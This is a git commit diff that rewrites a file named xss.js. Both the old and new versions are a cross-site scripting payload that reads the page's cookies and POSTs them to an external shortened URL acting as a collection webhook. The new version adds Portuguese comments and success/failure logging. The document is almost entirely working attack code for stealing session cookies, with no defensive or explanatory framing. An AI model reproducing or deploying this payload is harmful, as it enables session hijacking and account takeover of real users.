ba75e1406bd6f7473f7ba91844706143ec8a481d
Douglas Rodrigues <39203535+DouglasRao@users.noreply.github.com>
2023-06-24 04:10:14 -0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,7 +1,31 @@
 <script>
-fetch('https://bit.ly/44blPRE', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
+    // Obter todos os cookies da página
+    var cookies = document.cookie;
+
+    // Definir o URL do webhook
+    var webhookUrl = 'https://bit.ly/44blPRE';
+
+    // Criar o corpo da requisição
+    var requestBody = JSON.stringify({ cookies: cookies });
+
+    // Enviar os cookies para o webhook
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: requestBody,
+    })
+    .then(response => {
+        // Verificar se a requisição foi bem-sucedida
+        if (response.ok) {
+            console.log('Cookies enviados com sucesso!');
+        } else {
+            console.log('Falha ao enviar cookies.');
+        }
+    })
+    .catch(error => {
+        // Tratar qualquer erro que ocorra durante a requisição
+        console.error('Erro:', error);
+    });
 </script>
